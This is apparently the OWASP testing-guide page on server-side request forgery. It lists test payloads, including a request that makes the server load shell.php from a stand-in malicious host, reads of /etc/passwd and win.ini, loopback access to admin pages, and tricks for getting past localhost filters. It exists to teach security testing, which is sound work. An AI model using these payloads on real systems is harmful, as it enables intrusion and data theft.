# Testing for Server-Side Request Forgery

|ID          |
|------------|
|WSTG-INPV-19|

## Summary

Web applications often interact with internal or external resources. While you may expect that only the intended resource will be handling the data you send, improperly handled data may create a situation where injection attacks are possible. One type of injection attack is called Server-side Request Forgery (SSRF). A successful SSRF attack can grant the attacker access to restricted actions, internal services, or internal files within the application or the organization. In some cases, it can even lead to Remote Code Execution (RCE).

## Test Objectives

- Identify SSRF injection points.
- Test if the injection points are exploitable.
- Asses the severity of the vulnerability.

## How to Test

When testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be malicious. The most common test is for local and remote file inclusion. There is also another facet to SSRF: a trust relationship that often arises where the application server is able to interact with other back-end systems that are not directly reachable by users. These back-end systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls. These internal systems often contain sensitive data or functionality.

Consider the following request:

``` http
GET https://example.com/page?page=about.php
```

You can test this request with the following payloads.

### Load the Contents of a File

```http
GET https://example.com/page?page=https://malicioussite.com/shell.php
```

### Access a Restricted Page

```http
GET https://example.com/page?page=http://localhost/admin
```

Or:

```http
GET https://example.com/page?page=http://127.0.0.1/admin
```

Use the loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host, you also have privileges to directly access the `admin` page.

These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what enables SSRF to be a critical vulnerability.

### Fetch a Local File

```http
GET https://example.com/page?page=file:///etc/passwd
```

### HTTP Methods Used

All of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.

One important note on SSRF with POST requests is that the SSRF may also manifest in a blind manner, because the application may not return anything immediately. Instead, the injected data may be used in other functionality such as PDF reports, invoice or order handling, etc., which may be visible to employees or staff but not necessarily to the end user or tester.

You can find more on Blind SSRF [here](https://portswigger.net/web-security/ssrf/blind), or in the [references section](#references).

### PDF Generators

In some cases, a server may convert uploaded files to PDF format. Try injecting `<iframe>`, `<img>`, `<base>`, or `<script>` elements, or CSS `url()` functions pointing to internal services.

```html
<iframe src="file:///etc/passwd" width="400" height="400">
<iframe src="file:///c:/windows/win.ini" width="400" height="400">
```

### Common Filter Bypass

Some applications block references to `localhost` and `127.0.0.1`. This can be circumvented by:

- Using alternative IP representation that evaluate to `127.0.0.1`:
  - Decimal notation: `2130706433`
  - Octal notation: `017700000001`
  - IP shortening: `127.1`
- String obfuscation
- Registering your own domain that resolves to `127.0.0.1`

Sometimes the application allows input that matches a certain expression, like a domain. That can be circumvented if the URL schema parser is not properly implemented, resulting in attacks similar to [semantic attacks](https://tools.ietf.org/html/rfc3986#section-7.6).

- Using the `@` character to separate between the userinfo and the host: `https://expected-domain@attacker-domain`
- URL fragmentation with the `#` character: `https://attacker-domain#expected-domain`
- URL encoding
- Fuzzing
- Combinations of all of the above

For additional payloads and bypass techniques, see the [references](#references) section.

## Remediation

SSRF is known to be one of the hardest attacks to defeat without the use of allow lists that require specific IPs and URLs to be allowed. For more on SSRF prevention, read the [Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).

## References

- [swisskyrepo: SSRF Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Reading Internal Files Using SSRF Vulnerability](https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb)
- [Abusing the AWS Metadata Service Using SSRF Vulnerabilities](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/)
- [OWASP Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Portswigger: SSRF](https://portswigger.net/web-security/ssrf)
- [Portswigger: Blind SSRF](https://portswigger.net/web-security/ssrf/blind)
- [Bugcrowd Webinar: SSRF](https://www.bugcrowd.com/resources/webinars/server-side-request-forgery/)
- [Hackerone Blog: SSRF](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
- [Hacker101: SSRF](https://www.hacker101.com/sessions/ssrf.html)
- [URI Generic Syntax](https://tools.ietf.org/html/rfc3986)
